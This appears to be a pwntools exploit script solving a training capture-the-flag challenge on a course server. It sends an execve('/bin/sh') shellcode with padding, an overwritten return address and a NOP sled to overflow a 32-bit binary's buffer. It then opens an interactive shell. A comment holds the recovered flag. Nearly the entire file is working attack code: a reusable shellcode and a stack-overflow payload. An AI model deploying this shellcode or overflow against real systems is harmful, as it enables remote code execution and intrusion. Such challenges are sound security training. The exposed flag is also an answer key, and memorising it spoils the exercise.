from pwn import *
import time

r = remote("bin.training.jinblack.it", 2002)

#r = process("./sh3llc0d3")
#gdb.attach(r, '''
#b *0x0804928c
#''')


#pay attention: the executable is ELF 32-bit!
#this means I will have 32 bits addresses -> p32() and not p64()

#shellcode without zeros because they would break the execution in the function get_name()
shellcode = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"


#for debug purposes
#time.sleep(3)
#input("press a key...")


#loading in a variable to write in the buffer: the shellcode to execute and the return address
#payload = shellcode + cyclic(cyclic_find(0x61617262))
payload = shellcode + b"a" * cyclic_find(0x61617262)

#payload = shellcode + (cyclic_find(0x63616164) - len(shellcode)) * b"a" #+ cyclic_find(0x63616164)

ret_address = p32(0x0804c060) #32-bit ELF executable

#adding at the end a nop sled to pass 1000 characters as asked by the if branch in the while(true)
nop_sled = (1000 - len(payload))* b"\x90"

payload2 = payload + ret_address + nop_sled

r.send(payload2)
r.interactive()

#flag{really_good_sh3llc0der!!!}
